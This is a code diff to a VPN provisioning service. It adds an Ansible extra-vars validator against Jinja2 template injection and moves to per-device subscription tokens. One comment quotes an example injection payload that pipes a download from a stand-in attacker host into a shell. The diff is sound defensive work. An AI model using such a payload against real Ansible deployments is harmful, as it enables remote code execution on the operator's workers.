@@ -272,6 +272,84 @@ def _build_vless_xhttp_credential(
 
 # ── Extra vars collection for Ansible site.yml ────────────────────────
 
+# Jinja2 template markers — any of these appearing in a value we pass
+# via ``--extra-vars`` gets that value re-evaluated by the ansible role
+# it lands in. That's the RCE path we have to close: an admin-scoped
+# VPNConfig.settings payload like ``{"short_id": "{{ lookup('pipe',
+# 'curl attacker.example | sh') }}"}`` would execute on the worker the
+# first time any role references ``vless_reality_short_id``. ``json.dumps``
+# protects against shell injection at the cli level but does nothing
+# about Jinja2, which runs AFTER the JSON is decoded.
+_JINJA_MARKERS: tuple[str, ...] = ("{{", "}}", "{%", "%}", "{#", "#}")
+
+# Extra_vars names that ansible itself uses or reserves — an attacker
+# that manages to sneak any of these into our extra dict could redirect
+# SSH targets, private key paths, become users, etc. Defense-in-depth:
+# our collector only writes hand-picked keys, so a breach of this list
+# means a code bug upstream, not user input. But the check is free.
+_FORBIDDEN_EXTRA_KEYS = frozenset(
+    {
+        "ansible_host",
+        "ansible_port",
+        "ansible_user",
+        "ansible_connection",
+        "ansible_ssh_private_key_file",
+        "ansible_ssh_common_args",
+        "ansible_ssh_extra_args",
+        "ansible_become",
+        "ansible_become_user",
+        "ansible_become_method",
+        "ansible_python_interpreter",
+        "ansible_shell_executable",
+        "hostvars",
+        "groups",
+        "group_names",
+        "inventory_hostname",
+    }
+)
+
+
+def _validate_extra_vars(extra: dict[str, Any], *, node_hint: str) -> None:
+    """Defence-in-depth check before we hand ``extra`` to ansible.
+
+    Rejects values that would open Jinja2 template injection, newline
+    injection, or that use an ansible-reserved key name. Only string
+    values are scanned for markers — ints, lists of ints and bools pass
+    straight through (no template evaluation on non-strings).
+
+    ``node_hint`` is embedded in the error for operator triage (so a
+    failing task in /admin/tasks names the node whose config is bad).
+
+    Raises :class:`ValueError` with the first offending key+reason so
+    the provisioning task fails loudly rather than silently running a
+    poisoned playbook.
+    """
+    for key, value in extra.items():
+        if key in _FORBIDDEN_EXTRA_KEYS:
+            raise ValueError(
+                f"extra_vars for node {node_hint}: key {key!r} is reserved by ansible"
+            )
+        if isinstance(value, str):
+            for marker in _JINJA_MARKERS:
+                if marker in value:
+                    raise ValueError(
+                        f"extra_vars for node {node_hint}: key {key!r} contains "
+                        f"Jinja2 marker {marker!r} — would be re-evaluated by ansible "
+                        "and is a template-injection vector"
+                    )
+            if "\n" in value or "\r" in value:
+                raise ValueError(
+                    f"extra_vars for node {node_hint}: key {key!r} contains a "
+                    "newline — rejected to prevent YAML corruption if the role "
+                    "writes it to a config file"
+                )
+            if "\x00" in value:
+                raise ValueError(
+                    f"extra_vars for node {node_hint}: key {key!r} contains a "
+                    "NUL byte"
+                )
+
+
 def _collect_site_extra_vars(node: models.VPNNode) -> dict[str, Any]:
     """Build extra_vars for a node-level site.yml run.
 
@@ -373,6 +451,13 @@ def _collect_site_extra_vars(node: models.VPNNode) -> dict[str, Any]:
             "relay_wg_endpoint": rc.get("wg_endpoint", ""),
             "relay_wg_exit_public_key": rc.get("wg_exit_public_key", ""),
         })
+
+    # #56 — last-line defence before this dict gets serialised to
+    # --extra-vars. Catches admin-controlled values from VPNConfig.settings
+    # that would weaponise an ansible role's ``{{ var }}`` usage. Runs
+    # here (not in the caller) so every code path that builds site
+    # extra_vars goes through it — including future ones.
+    _validate_extra_vars(extra, node_hint=f"{node.id}/{node.name}")
 
     return extra
 
@@ -632,12 +717,16 @@ class ProvisioningOrchestrator:
                             node.id,
                         )
             else:
-                # Don't downgrade an already-active node on a transient
-                # rerun failure — leave it active, surface the task
-                # error via the /admin/tasks UI. Only freshly-registering
-                # nodes get marked failed.
+                # Don't downgrade an already-active node's status on a
+                # transient rerun failure — existing users need to stay
+                # connected. Only freshly-registering nodes get marked
+                # failed. But DO zero out health_score (#64) so the
+                # autoscale selector stops assigning new users to this
+                # node until it recovers.
                 if node.status == models.VPNNodeStatus.registering:
                     node.status = models.VPNNodeStatus.error
+                else:
+                    node.health_score = 0
             self.db.add(node)
             self.db.commit()
             return
@@ -834,11 +923,12 @@ class ProvisioningOrchestrator:
             raise RuntimeError("warm bundle anchor has no config_id")
 
         device_label = device_name or "primary"
+        device_sub_token = secrets.token_urlsafe(32)
         sub_base = os.getenv("SUB_LINK_BASE_URL", "").rstrip("/")
         if sub_base:
-            device_uri = f"{sub_base}/{subscription.sub_token}"
+            device_uri = f"{sub_base}/{device_sub_token}"
         else:
-            device_uri = f"/api/sub/{subscription.sub_token}"
+            device_uri = f"/api/sub/{device_sub_token}"
 
         device = models.Device(
             user_id=user.id,
@@ -848,6 +938,7 @@ class ProvisioningOrchestrator:
             status=models.DeviceStatus.active,  # already live on the node
             access_username=bundle[0].access_username,
             connection_uri=encrypt(device_uri),
+            sub_token=device_sub_token,
         )
         self.db.add(device)
         self.db.flush()
@@ -965,13 +1056,15 @@ class ProvisioningOrchestrator:
         password = secrets.token_urlsafe(12)
         user_uuid = uuid.uuid4()
 
-        # Device.connection_uri now stores the public sub-link, not a raw
-        # protocol URI — admin UI shows one stable URL per device.
+        # Each device gets its own sub_token so /sub/{token} returns only
+        # this device's credentials. Sharing the link exposes one device,
+        # not the entire subscription.
+        device_sub_token = secrets.token_urlsafe(32)
         sub_base = os.getenv("SUB_LINK_BASE_URL", "").rstrip("/")
         if sub_base:
-            device_uri = f"{sub_base}/{subscription.sub_token}"
+            device_uri = f"{sub_base}/{device_sub_token}"
         else:
-            device_uri = f"/api/sub/{subscription.sub_token}"
+            device_uri = f"/api/sub/{device_sub_token}"
 
         # Pick a representative config for Device.config_id (FK is NOT NULL).
         # ShadowTLS preferred, otherwise the first enabled config.
@@ -988,6 +1081,7 @@ class ProvisioningOrchestrator:
             status=models.DeviceStatus.pending,
             access_username=username,
             connection_uri=encrypt(device_uri),
+            sub_token=device_sub_token,
         )
         self.db.add(device)
         self.db.flush()
@@ -1242,11 +1336,12 @@ class ProvisioningOrchestrator:
         password = secrets.token_urlsafe(12)
         user_uuid = uuid.uuid4()
 
+        device_sub_token = secrets.token_urlsafe(32)
         sub_base = os.getenv("SUB_LINK_BASE_URL", "").rstrip("/")
         if sub_base:
-            device_uri = f"{sub_base}/{subscription.sub_token}"
+            device_uri = f"{sub_base}/{device_sub_token}"
         else:
-            device_uri = f"/api/sub/{subscription.sub_token}"
+            device_uri = f"/api/sub/{device_sub_token}"
 
         primary_config = next(
             (c for c in enabled_configs if c.protocol == models.VPNConfigProtocol.shadowtls_ss),
@@ -1261,6 +1356,7 @@ class ProvisioningOrchestrator:
             status=models.DeviceStatus.pending,
             access_username=username,
             connection_uri=encrypt(device_uri),
+            sub_token=device_sub_token,
         )
         self.db.add(device)
         self.db.flush()
